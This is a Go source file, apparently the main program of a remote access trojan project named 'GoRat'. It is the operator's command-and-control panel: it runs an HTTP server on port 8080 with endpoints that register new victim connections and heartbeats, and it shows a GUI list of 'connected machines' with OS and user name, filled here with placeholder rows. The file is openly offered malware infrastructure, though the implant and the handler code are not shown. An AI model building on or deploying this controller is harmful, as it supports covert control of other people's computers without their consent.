package main

import (
	"fmt"
	"net/http"

	"github.com/NotKatsu/GoRat/modules/database"

	"github.com/NotKatsu/GoRat/modules/endpoints"
	"github.com/pterm/pterm"

	go_rat "github.com/AllenDang/giu"
)

func CreateClientTable() []*go_rat.TableRowWidget {
	rows := make([]*go_rat.TableRowWidget, 0)

	for i := 1; i < 5; i++ {
		row := go_rat.TableRow(
			go_rat.Label("AABE9B69-76A3-4344-A2CC-9540838DBJAA"),
			go_rat.Label("Windows 11 Home"),
			go_rat.Label("Joe Bloggs"),
		)

		rows = append(rows, row)
	}

	return rows
}

func mainWindow() {
	go_rat.SingleWindow().Layout(
		go_rat.Label(fmt.Sprint("Logs:")),
		go_rat.ListBox("Logs", []string{"Listening on port 8080...", "New Connection from AABE9B69-76A3-4344-A2CC-9540838DBJAA", "New Connection from AABE9B69-76A3-4344-A2CC-9540838DBJAA"}).Size(950, 200),

		go_rat.Label(fmt.Sprintf("Connected Machines (%d)", 4)),

		go_rat.Table().Columns(
			go_rat.TableColumn("MAC Address"),
			go_rat.TableColumn("OS"),
			go_rat.TableColumn("Name")).Rows(CreateClientTable()...))
}

func main() {
	if database.CreateTables() {
		go func() {
			http.HandleFunc("/connection/new", endpoints.ConnectionNew)
			http.HandleFunc("/connection/heartbeat", endpoints.ConnectionHeartbeat)

			err := http.ListenAndServe(":8080", nil)
			if err != nil {
				pterm.Fatal.WithFatal(true).Println(err)
			}
		}()

		window := go_rat.NewMasterWindow("GoRat", 950, 550, go_rat.MasterWindowFlagsNotResizable)
		window.Run(mainWindow)
	} else {
		pterm.Fatal.WithFatal(true).Println("There was an error when the database tables were trying to be created.")
	}
}
